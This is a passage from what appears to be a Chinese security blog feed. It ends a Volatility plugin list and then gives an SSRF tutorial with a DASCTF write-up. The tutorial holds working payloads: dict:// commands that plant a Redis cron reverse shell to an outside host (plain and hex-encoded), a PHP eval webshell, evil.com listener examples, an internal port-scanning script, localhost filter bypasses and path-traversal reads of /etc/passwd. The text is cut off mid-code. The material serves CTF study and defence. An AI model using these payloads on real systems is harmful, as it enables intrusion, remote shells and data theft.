addressable memory for a process #转储进程的可寻址内存</span><br><span class="line">                memmap          Print the memory map</span><br><span class="line">                messagehooks    List desktop and thread window message hooks</span><br><span class="line">                mftparser       Scans for and parses potential MFT entries </span><br><span class="line">                moddump         Dump a kernel driver to an executable file sample</span><br><span class="line">                modscan         Pool scanner for kernel modules</span><br><span class="line">                modules         Print list of loaded modules</span><br><span class="line">                multiscan       Scan for various objects at once</span><br><span class="line">                mutantscan      Pool scanner for mutex objects</span><br><span class="line">                notepad         List currently displayed notepad text</span><br><span class="line">   netscan #扫描网络情况</span><br><span class="line">   objtypescan     Scan for Windows object type objects</span><br><span class="line">                patcher         Patches memory based on page scans</span><br><span class="line">                poolpeek        Configurable pool scanner plugin</span><br><span class="line">                printkey        Print a registry key, and its subkeys and values #打印注册表项及其子项和值</span><br><span class="line">                privs           Display process privileges</span><br><span class="line">                procdump        Dump a process to an executable file sample # 进程转储到一个可执行文件示例</span><br><span class="line">                pslist          Print all running processes by following the EPROCESS lists  #打印进程</span><br><span class="line">                psscan          Pool scanner for process objects #进程对象池扫描</span><br><span class="line">                pstree          Print process list as a tree #以树型方式打印进程列表</span><br><span class="line">                psxview         Find hidden processes with various process listings #查找带有隐藏进程的所有进程列表</span><br><span class="line">                qemuinfo        Dump Qemu information</span><br><span class="line">                raw2dmp         Converts a physical memory sample to a windbg crash dump</span><br><span class="line">                screenshot      Save a pseudo-screenshot based on GDI windows</span><br><span class="line">                servicediff     List Windows services (ala Plugx)</span><br><span class="line">                sessions        List details on _MM_SESSION_SPACE (user logon sessions)</span><br><span class="line">                shellbags       Prints ShellBags info</span><br><span class="line">                shimcache       Parses the Application Compatibility Shim Cache registry key</span><br><span class="line">                shutdowntime    Print ShutdownTime of machine from registry</span><br><span class="line">                sockets         Print list of open sockets</span><br><span class="line">                sockscan        Pool scanner for tcp socket objects</span><br><span class="line">                ssdt            Display SSDT entries</span><br><span class="line">                strings         Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">                svcscan         Scan for Windows services</span><br><span class="line">                symlinkscan     Pool scanner for symlink objects</span><br><span class="line">                thrdscan        Pool scanner for thread objects</span><br><span class="line">                threads         Investigate _ETHREAD and _KTHREADs</span><br><span class="line">                timeliner       Creates a timeline from various artifacts in memory </span><br><span class="line">                timers          Print kernel timers and associated module DPCs</span><br><span class="line">                truecryptmaster Recover TrueCrypt 7.1a Master Keys</span><br><span class="line">                truecryptpassphrase     TrueCrypt Cached Passphrase Finder</span><br><span class="line">                truecryptsummary        TrueCrypt Summary</span><br><span class="line">                unloadedmodules Print list of unloaded modules</span><br><span class="line">                userassist      Print userassist registry keys and information</span><br><span class="line">                userhandles     Dump the USER handle tables</span><br><span class="line">                vaddump         Dumps out the vad sections to a file</span><br><span class="line">                vadinfo         Dump the VAD info</span><br><span class="line">                vadtree         Walk the VAD tree and display in tree format</span><br><span class="line">                vadwalk         Walk the VAD tree</span><br><span class="line">                vboxinfo        Dump virtualbox information</span><br><span class="line">                verinfo         Prints out the version information from PE images</span><br><span class="line">                vmwareinfo      Dump VMware VMSS/VMSN information</span><br><span class="line">                volshell        Shell in the memory image</span><br><span class="line">                windows         Print Desktop Windows (verbose details)</span><br><span class="line">                wintree         Print Z-Order Desktop Windows Tree</span><br><span class="line">                wndscan         Pool scanner for window stations</span><br><span class="line">                yarascan        Scan process or kernel memory with Yara signatures</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;volatility&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#volatility&quot;&gt;#&lt;/a&gt; Volatility&lt;/h1&gt;
&lt;h2 id=&quot;先以otterctf为例&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="http://example.com/2024/04/22/SSRF/"/>
    <id>http://example.com/2024/04/22/SSRF/</id>
    <published>2024-04-22T13:56:10.000Z</published>
    <updated>2024-04-23T05:04:55.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf">#</a> SSRF</h1><h2 id="dasctf-x-gfctf-2024-easysignin"><a class="markdownIt-Anchor" href="#dasctf-x-gfctf-2024-easysignin">#</a> DASCTF X GFCTF 2024 | EasySignin</h2><p>首先复现一道最近比赛遇到的一道题</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/IWw2RAmLtjMisFH.png" alt="image.png"></p><p>经典登陆界面开局，先尝试 admin 123456，密码错误，注册一个 admin1 123456，登上去之后看好康的照片，不给看，权限不够，应该还是需要登录 admin，发现有一个更改密码的选项，可以利用一下</p><p>这里有两种方式：</p><p>1. 利用 sql 注入</p><p>注册时用户名为 <code>admin&quot;#</code> 双引号会闭合前面的引号，# 注释掉后面的内容，此时登录之后更改密码实际会更改 <code>admin</code>  的密码，在登陆 admin 就可以看了</p><p>2.burp 抓包</p><p>修改密码利用 bp 抓包</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/RuP9V7keCf3Kb8Y.png" alt="image.png"></p><p>发现会显示 username，且这里未验证 session 中的 username 和输入的 username 是否相同，那这里就存在逻辑漏洞了，可以尝试将 username 赋值为 admin，即可以越权修改 admin 的密码，修改密码后以 admin 密码登录。</p><p>登录到 admin 之后查看好康的照片</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/22/1YukL6P4.png" alt="1713795160605.png"></p><p>发现直接显示了文件的地址，下面就要用到 SSRF 的知识了，测试一下，过滤掉了 file、dict 等几个协议，但没过滤 gopher，可以用它探测服务和端口，探测到 3306 端口开放了 mysql 服务，这里 root 的密码为空，于是我们可以利用 gopher 协议去攻击 mysql。</p><p>直接利用 Gopherus 查看根目录下的 flag 文件</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/Fpa2BKjsRrZeNw8.png" alt="image.png"></p><p>二次 url 编码，bp 抓包</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/DNrAxPlFmZ58GHu.png" alt="image.png"></p><p>base64 解码得到 flag： <code>DASCTF&#123;39302405-b602-4b99-8101-66cd65424bbe&#125;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/22/kgFEKOrs6Q7NxWP.png" alt="image.png"></p><h2 id="ssrf-2"><a class="markdownIt-Anchor" href="#ssrf-2">#</a> SSRF</h2><h3 id="ssrf是什么"><a class="markdownIt-Anchor" href="#ssrf是什么">#</a> SSRF 是什么？</h3><p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由<strong>服务端</strong>发起请求的一个安全漏洞。</p><p>由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。</p><p>一般情况下，SSRF 攻击的目标是<strong>从外网无法访问的内部系统</strong>。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>比如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf 是利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器</p><h3 id="ssrf与csrf的区别"><a class="markdownIt-Anchor" href="#ssrf与csrf的区别">#</a> SSRF 与 CSRF 的区别</h3><p>​    CSRF 是服务器端没有对用户提交的数据进行随机值校验，且对 http 请求包内的 refer 字段校验不严，导致攻击者可以利用用户的 cookie 信息伪造用户请求发送至服务器；</p><p>​    SSRF 是服务器对用户提供的可控 URL 过于信任，没有对攻击者提供的 URL 进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。</p><h3 id="ssrf中url的伪协议"><a class="markdownIt-Anchor" href="#ssrf中url的伪协议">#</a> SSRF 中 URL 的伪协议</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如:file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如:dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure></div><h4 id="1-file"><a class="markdownIt-Anchor" href="#1-file">#</a> 1、file</h4><p>这种 URL Schema 可以尝试从系统文件中获取文件</p><p><code>file://文件的绝对路径</code></p><blockquote><p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p><p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p></blockquote><h4 id="2-dict"><a class="markdownIt-Anchor" href="#2-dict">#</a> 2、dict</h4><p>dict 协议一般常用来探测内网主机以及端口开放情况，既然能够探测端口，那么可以探测不同端口对应的服务的指纹信息。当然 dict 协议也可以用来执行一些服务的命令，如 redis</p><ul><li>内网主机探测</li><li>开放端口探测</li><li>端口服务指纹探测</li><li>执行命令</li></ul><p><code>ditc://ip:port</code></p><p><code>ditc://ip:port/命令</code></p><p>这种 URL Scheme 能够引用允许通过 DICT 协议使用的定义或单词列表：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></div><h4 id="3-sftp"><a class="markdownIt-Anchor" href="#3-sftp">#</a> 3、sftp</h4><p>在这里，Sftp 代表 SSH 文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与 SSH 打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">一、dict协议探测端口和服务指纹</span><br><span class="line">dict://127.0.0.1:22</span><br><span class="line">dict://172.22.10.10:3306</span><br><span class="line">dict://127.0.0.1:6379/info</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">二、dict协议攻击redis，写入定时任务，进行反弹shell</span><br><span class="line">centos系统定时任务的路径为：/var/spool/cron</span><br><span class="line">debian系统定时任务的路径为：/var/spool/cron/crontabs</span><br><span class="line"> </span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:root</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/spool/cron</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"> </span><br><span class="line">注意：若payload存在被转义或过滤的情况，可利用16进制写入内容</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">三、dict协议攻击redis，写入webshell</span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:test.php</span><br><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/www/html</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n&lt;?php @eval($_POST[x]);?&gt;\n\n&quot;</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"> </span><br><span class="line">若存在过滤， 则利用16进制内容写入：</span><br><span class="line">dict://127.0.0.1:6379/set:test:&quot;\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">四、dict协议攻击redis，写入ssh公钥</span><br><span class="line">操作和写入定时任务相似</span><br></pre></td></tr></table></figure></div><h4 id="4-gopher协议"><a class="markdownIt-Anchor" href="#4-gopher协议">#</a> 4、gopher 协议</h4><p>上面官方的说明了一下 gopher 协议介绍，具体如何在 ssrf 中使用呢？</p><p>gopher 协议在 ssrf 的利用中一般用来攻击 redis，mysql，fastcgi，smtp 等服务。</p><p>gopher 协议数据格式：</p><p><code>gopher://ip:port/_TCP/IP数据流</code></p><p>注意：</p><blockquote><p>1.gopher 协议数据流中，url 编码使用 %0d%0a 替换字符串中的回车换行<br> 2. 数据流末尾使用 %0d%0a 代表消息结束</p></blockquote><h4 id="5-ldap或ldaps-或ldapi"><a class="markdownIt-Anchor" href="#5-ldap或ldaps-或ldapi">#</a> 5、ldap:// 或 ldaps:// 或 ldapi://</h4><p>LDAP 代表轻量级目录访问协议。它是 IP 网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></div><h4 id="6-tftp"><a class="markdownIt-Anchor" href="#6-tftp">#</a> 6、tftp://</h4><p>TFTP（Trivial File Transfer Protocol, 简单文件传输协议）是一种简单的基于 lockstep 机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></div><h3 id="探测内网"><a class="markdownIt-Anchor" href="#探测内网">#</a> 探测内网</h3><p>ssrf 最常见的就是探测内网，如果找到了内网 IP 的网段，可以尝试用暴力破解去探测内网的 IP，下面给出几种常见的探测方法。</p><ul><li>脚本</li></ul><p>这里贴一个通用的 python 脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ports = [<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;6379&#x27;</span>,<span class="string">&#x27;3306&#x27;</span>,<span class="string">&#x27;8080&#x27;</span>,<span class="string">&#x27;8000&#x27;</span>]</span><br><span class="line">session = requests.Session();</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line"> ip = <span class="string">&#x27;192.168.0.%d&#x27;</span> % i <span class="comment">#内网ip地址</span></span><br><span class="line"> <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">  url = <span class="string">&#x27;http://ip/?url=http://%s:%s&#x27;</span> %(ip,port)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">   res = session.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(res.text) != <span class="number">0</span> :    <span class="comment">#这里长度根据实际情况改</span></span><br><span class="line">    <span class="built_in">print</span>(ip,port,<span class="string">&#x27;is open&#x27;</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>这里写的是爆破指定的一些端口和 IP 的 D 段，注意的是有些题目会给出端口的范围，就可以把 ports 改为 <code>range()</code>  指定为一定的范围，然后返回的长度 <code>len(res.text)</code>  要先自己测一下。</p><ul><li>burpsuite</li></ul><p>可以选择用 burpsuite 软件中 Intruder 去爆破</p><ul><li>nmap 工具</li></ul><p>扫描目标开放端口，直接用 nmap 一把梭。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV ip</span><br><span class="line">nmap -sV ip -p6379 //指定6379端口扫描</span><br></pre></td></tr></table></figure></div><h3 id="bypass"><a class="markdownIt-Anchor" href="#bypass">#</a> Bypass</h3><p>经常会有题目 ban 掉 127.0.0.1 这个网址，需要进行绕过</p><h4 id="xipio"><a class="markdownIt-Anchor" href="#xipio">#</a> <a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p>有一个网站地址是：<a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p><p>当我们访问： <code>http://127.0.0.1.xip.io/1.php</code> ，实际上访问的是 <code>http://127.0.0.1/1.php</code> 。</p><p><a class="link" href="http://xn--nip-ve1en80a0uy063a0hj9o1bga.io">像这种网址还有 nip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link" href="http://sslip.io">sslip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>如果 php 后端只是用 parse_url 函数中的 host 参数判断是否等于 127.0.0.1，就可以用这种方法绕过，但是如果是检查是否存在关键字 127.0.0.1，这种方法就不可行了</p><h4 id="短地址绕过"><a class="markdownIt-Anchor" href="#短地址绕过">#</a> 短地址绕过</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/Pjbm4EWVKTFqkgp.png" alt="image.png"></p><p>此时直接用 <code>http://z6b.cn/yPqiU</code>  就会 302 跳转绕过 WAF</p><h4 id="进制转换"><a class="markdownIt-Anchor" href="#进制转换">#</a> 进制转换</h4><p>可以使用一些不同的进制替代 ip 地址，从而绕过 WAF，</p><p>贴一个进制转换的 php 脚本</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>注意八进制 ip 前要加上一个 0，其中八进制前面的 0 可以为多个，十六进制前要加上一个 0x。</p><p>127.0.0.1：</p><blockquote><p>八进制：0177.0.0.1</p><p>十六进制：0x7f.0.0.1</p><p>十进制：2130706433</p></blockquote><h4 id="利用dns解析"><a class="markdownIt-Anchor" href="#利用dns解析">#</a> 利用 DNS 解析</h4><p>如果你自己有域名的话，可以在域名上设置 A 记录，指向 127.0.0.1。</p><h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过">#</a> @绕过</h4><p><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code> ，在对 @解析域名中，不同的处理函数存在处理差异<br>在 PHP 的 parse_url 中会识别 <code>www.ccc.com</code> ，而 libcurl 则识别为 <code>www.bbb.com</code> 。</p><h4 id="其他各种指向127001的地址"><a class="markdownIt-Anchor" href="#其他各种指向127001的地址">#</a> 其他各种指向 127.0.0.1 的地址</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ #localhost就是127.0.0.1</span><br><span class="line">http://0/ #0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/ #linux可用</span><br><span class="line">http://[::]:80/ #linux可用</span><br><span class="line">http://127。0。0。1/ #句号会被解析成.</span><br><span class="line">http://①②⑦.⓪.⓪.① #Enclosed alphanumerics方法绕过</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ #第7.8行中0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></figure></div><h4 id="常见限制"><a class="markdownIt-Anchor" href="#常见限制">#</a> 常见限制</h4><p>1. 限制为 <code>http://www.xxx.com </code> 域名</p><p>采用 http 基本身份认证的方式绕过，即 @<br> <code>http://www.xxx.com@www.xxc.com</code></p><p>2. 限制请求 IP 不为内网地址</p><p>当不允许 ip 为内网地址时：</p><blockquote><p>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p></blockquote><p>3. 限制请求只为 http 协议</p><blockquote><p>（1）采取 302 跳转（<a class="link" href="http://xip.io">xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）<br>（2）采取短地址</p></blockquote><h3 id="不存在的协议头绕过"><a class="markdownIt-Anchor" href="#不存在的协议头绕过">#</a> 不存在的协议头绕过</h3><p>有关 <code>file_get_contents()</code>  函数的一个 trick，可以看作是 SSRF 的一个黑魔法，当 PHP 的  <code>file_get_contents()</code>  函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。</p><p>例子：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>限制只读 https 开头的路径，可以构造： <code>httpssss://</code></p><p>配合目录回读：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">httpsssss://../../../../../../etc/passwd</span><br><span class="line">httpsssss://abc../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">httpsssss://../../../../../../flag</span><br></pre></td></tr></table></figure></div><p>可以得到一些敏感信息</p><h3 id="url的解析问题"><a class="markdownIt-Anchor" href="#url的解析问题">#</a> URL 的解析问题</h3><ul><li>利用 readfile 和 parse_url 解析差异</li></ul><p>贴一个极客大挑战的题</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span 